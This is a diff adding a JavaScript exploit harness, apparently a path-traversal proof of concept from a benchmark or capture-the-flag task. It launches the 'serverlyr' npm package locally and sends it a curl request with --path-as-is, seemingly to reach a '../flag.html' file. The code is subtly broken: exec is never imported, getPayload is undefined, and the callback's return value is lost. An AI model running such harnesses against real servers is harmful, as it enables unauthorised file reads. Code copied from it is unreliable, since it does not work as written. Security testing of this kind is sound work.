@@ -1,0 +1,31 @@
+function exploitFunction() {
+  const path = require("path");
+  const { sleep } = require("sleep");
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+
+  const serverCommand = "node ./node_modules/serverlyr/index.js";
+  const attackString = `curl -v --path-as-is "http://127.0.0.1:8888${getPayload()}"`;
+
+  // Start the server
+  exec(serverCommand, (error, stdout) => {
+    if (error) {
+      console.error(`Error starting server: ${error}`);
+      return;
+    }
+
+    sleep.sleep(2); // Wait for the server to start
+
+    // Perform the attack
+    exec(attackString, (error, stdout) => {
+      if (error) {
+        console.error(`Error during attack: ${error}`);
+        return;
+      }
+
+      // Return the output of the attack
+      return stdout;
+    });
+  });
+}
+
+module.exports = { exploitFunction };
